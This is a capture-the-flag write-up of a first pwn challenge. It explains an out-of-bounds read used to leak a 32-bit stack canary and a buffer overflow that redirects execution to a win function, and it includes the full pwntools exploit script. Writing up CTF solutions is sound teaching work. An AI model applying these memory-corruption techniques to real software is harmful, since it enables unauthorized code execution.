This was the first pwn challenge in the event.
In my opinion, it was a nice and easy challenge to start with.
The binary exposes a simple functionallity to the user:
The F option will let the user fill a buffer on the stack. nothing to fancy and no buffer overflow is present.
The V option, will read a char from the buffer. The program won't do any boundy checks, so we have an OOB read primitve.
Lastly, when we EXIT, there is an obvious bufferoverflow:
```c
  char name[68];
  printf("Name Size : ");
  __isoc99_scanf("%d", &name_size);
  printf("Name : ");
  read(0, name, name_size);

```

We can give a `size > 68` and write after the name variable.

The binary is compiled with stack canary, so in order to control the saved RIP, we would have to leak the canary,
We can use the V option to read after the buffer, and leak the canary. here is how I did it:

```py
from pwn import *

p = process('./main')

def view(idx):

	p.sendline("V")
	p.sendline(str(idx))
	p.recvuntil(f"Index {idx} : ")
	return p.recvline()[:-1]

canary = view(131) + view(130) + view(129) + b"00"

canary = int("0x" + canary.decode(), 16)
```
we know that every stack canary will start with a nullbyte, and the binary is 32bit, so the canary is only 4 bytes. thats why we need just 3 bytes to be leaked.
Then, when we know the canary we can exploit the bufferoverflow and jump to the win function:

```py
from pwn import *

p = process('./main')

def view(idx):

	p.sendline("V")
	p.sendline(str(idx))
	p.recvuntil(f"Index {idx} : ")
	return p.recvline()[:-1]

canary = view(131) + view(130) + view(129) + b"00"

canary = int("0x" + canary.decode(), 16)
win = 0x8049304


p.sendline(b"E")
p.sendline("1000") #read tons of chars
p.sendline(64 * b"A" + p32(canary) + b"BBBB" + p32(win))

p.interactive()
```
